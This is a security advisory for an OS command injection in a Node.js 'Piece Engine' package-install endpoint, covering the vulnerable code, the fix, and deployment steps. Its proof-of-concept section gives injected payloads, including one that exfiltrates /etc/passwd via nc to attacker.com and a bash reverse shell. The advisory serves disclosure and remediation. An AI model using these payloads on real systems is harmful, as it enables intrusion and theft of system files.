# Security Advisory: Command Injection in Piece Engine (Issue #525)

**Date:** March 23, 2026
**Issue:** #525
**Severity:** Critical (CVSS 3.1: 9.8/10)
**Status:** ✅ Fixed
**Fixed in Commit:** `4f40de7d8`

---

## Executive Summary

The Atom Piece Engine service was vulnerable to unauthenticated Remote Code Execution (RCE) via OS command injection. An attacker on the network could execute arbitrary commands as `root` by sending crafted HTTP requests to the `/sys/install` endpoint or by triggering `loadPiece()` via `/execute/action` and `/pieces/:name` endpoints.

## Vulnerability Details

### Affected Versions
- **All versions prior to commit `4f40de7d8`**
- Default Docker Compose configuration exposed port `3003` to the host network

### Vulnerability Type
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CAPEC-88:** OS Command Injection

### Attack Vector
The vulnerability existed in two locations where `child_process.exec()` was called with unsanitized user input:

1. **`loadPiece()` helper** (line 31): Called when a piece is not found locally
2. **`/sys/install` endpoint** (line 179): Direct package installation endpoint

### Original Vulnerable Code

```typescript
// Sink 1 - loadPiece() helper
await execAsync(`npm install ${pieceName} --save`);

// Sink 2 - /sys/install endpoint
await execAsync(`npm install ${packageName} --save`);
```

### Why This Was Vulnerable

1. **`exec()` spawns a shell** (`/bin/sh -c`), which interprets metacharacters
2. **No input validation** - User input was directly interpolated into the command string
3. **No authentication** - Anyone on the network could trigger installation
4. **Root execution** - Container runs as root by default

### Proof of Concept (Before Fix)

```bash
# Attack 1: Create a marker file
curl -X POST http://127.0.0.1:3003/sys/install \
     -H "Content-Type: application/json" \
     -d '{"packageName": "express; touch /tmp/pwned #"}'

# Attack 2: Exfiltrate /etc/passwd
curl -X POST http://127.0.0.1:3003/sys/install \
     -H "Content-Type": "application/json" \
     -d '{"packageName": "express; cat /etc/passwd | nc attacker.com 4444 #"}'

# Attack 3: Reverse shell
curl -X POST http://127.0.0.1:3003/sys/install \
     -H "Content-Type": "application/json" \
     -d '{"packageName": "express; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #"}'
```

## Fix Details

### 1. Command Injection Prevention

**Replaced `exec()` with `spawn()`:**

```typescript
function safeNpmInstall(packageName: string): Promise<void> {
    return new Promise((resolve, reject) => {
        // Use spawn with argument array to prevent shell injection
        const process = spawn('npm', ['install', packageName, '--save'], {
            stdio: 'inherit',
            shell: false  // Critical: Disable shell to prevent command injection
        });
        // ... error handling
    });
}
```

**Key Changes:**
- Uses argument array `['npm', 'install', packageName, '--save']` instead of template string
- Explicitly sets `shell: false` to prevent shell interpretation
- No metacharacter interpretation possible

### 2. Input Validation

**Added RFC-compliant package name validation:**

```typescript
const VALID_PACKAGE_NAME_REGEX = /^(?:@([a-z0-9-~][a-z0-9-._~]*)\/)?([a-z0-9-~][a-z0-9-._~]*)$/;

function isValidPackageName(packageName: string): boolean {
    if (!packageName || typeof packageName !== 'string') {
        return false;
    }
    if (packageName.length > 214) {
        return false;  // npm limits to 214 chars
    }
    return VALID_PACKAGE_NAME_REGEX.test(packageName);
}
```

**Rejected Patterns:**
- Semicolon injection: `package; command`
- Pipe injection: `package | command`
- Command substitution: `package$(command)` or `package\`command\``
- Newline injection: `package\ncommand`
- Special characters: `&`, `&&`, `||`, `>`, `<`, etc.

### 3. Authentication

**Added API key authentication middleware:**

```typescript
function authenticateRequest(req: Request, res: Response, next: NextFunction): void {
    if (!REQUIRE_AUTH) {
        next();
        return;
    }

    const apiKey = req.headers['x-api-key'] as string;
    const authHeader = req.headers['authorization'] as string;
    const bearerToken = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;
    const token = apiKey || bearerToken;

    if (!token) {
        return res.status(401).json({
            success: false,
            error: 'Authentication required.'
        });
    }

    if (token !== PIECE_ENGINE_API_KEY) {
        return res.status(403).json({
            success: false,
            error: 'Invalid API key'
        });
    }

    next();
}
```

**Protected Endpoints:**
- `POST /sys/install` - Direct package installation
- `POST /execute/action` - Can trigger dynamic package loading
- `GET /pieces/:name` - Can trigger dynamic package loading

**Public Endpoints (no auth required):**
- `GET /health` - Health check
- `GET /pieces` - List loaded pieces (metadata only)

### 4. Configuration

**Added environment variables:**

```yaml
# docker-compose.yml
environment:
  - REQUIRE_AUTH=true
  - PIECE_ENGINE_API_KEY=${PIECE_ENGINE_API_KEY:-change-this-to-a-secure-random-key}
```

**Generate a secure key:**
```bash
openssl rand -base64 32
```

## Verification

### After Fix: Request Rejected

```bash
$ curl -X POST http://127.0.0.1:3003/sys/install \
     -H "Content-Type: application/json" \
     -H "X-API-Key: your-api-key" \
     -d '{"packageName": "express; touch /tmp/pwned #"}'

# Response:
{
  "success": false,
  "error": "Invalid package name. Package names must follow npm naming conventions."
}
```

### Run Security Tests

```bash
cd backend/piece-engine
npm test

# Or run verification script:
node test/verify-fix.js
```

## Deployment Instructions

### 1. Update Environment Files

Add to your `.env` file:

```bash
# Generate a secure key with: openssl rand -base64 32
PIECE_ENGINE_API_KEY=your-secure-random-key-here
REQUIRE_AUTH=true
```

### 2. Pull Latest Code

```bash
git pull origin main
git checkout 4f40de7d8  # Ensure you have the fix commit
```

### 3. Rebuild and Restart

```bash
docker-compose down
docker-compose build atom-piece-engine
docker-compose up -d
```

### 4. Verify Fix

```bash
# Health check should work
curl http://localhost:3003/health

# Package install should require auth and reject invalid names
curl -X POST http://localhost:3003/sys/install \
     -H "Content-Type: application/json" \
     -d '{"packageName": "express; touch /tmp/pwned #"}'

# Expected: 401 Unauthorized or 400 Bad Request
```

## Impact Assessment

### Before Fix
- **Any** network-reachable attacker could execute arbitrary commands as `root`
- No authentication required
- Full container compromise possible
- Potential for lateral movement to other services

### After Fix
- Command injection attempts are **blocked** by input validation
- Package installation requires **authentication**
- Shell interpretation is **disabled** (`shell: false`)
- Only valid npm package names are accepted

## Additional Recommendations

1. **Network Isolation**: Consider exposing the Piece Engine only on the Docker internal network, not to the host
2. **Rate Limiting**: Add rate limiting to prevent brute force attacks on the API key
3. **Container Security**: Run containers as non-root user where possible
4. **Monitoring**: Enable audit logging for all package installation attempts
5. **Regular Updates**: Keep npm packages updated to prevent dependency vulnerabilities

## References

- **Issue**: https://github.com/rush86999/atom/issues/525
- **Fix Commit**: https://github.com/rush86999/atom/commit/4f40de7d8
- **NPM Package Naming**: https://github.com/npm/validate-npm-package-name
- **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
- **Node.js Security Best Practices**: https://nodejs.org/en/docs/guides/security/

## Credits

- **Reported by**: Security researcher (via GitHub Issue #525)
- **Fixed by**: Claude Sonnet 4.5 with Rushi P.
- **Verified**: Security tests added in commit `8e9b0deb1`

---

**Questions or concerns?** Open an issue or contact the maintainers.
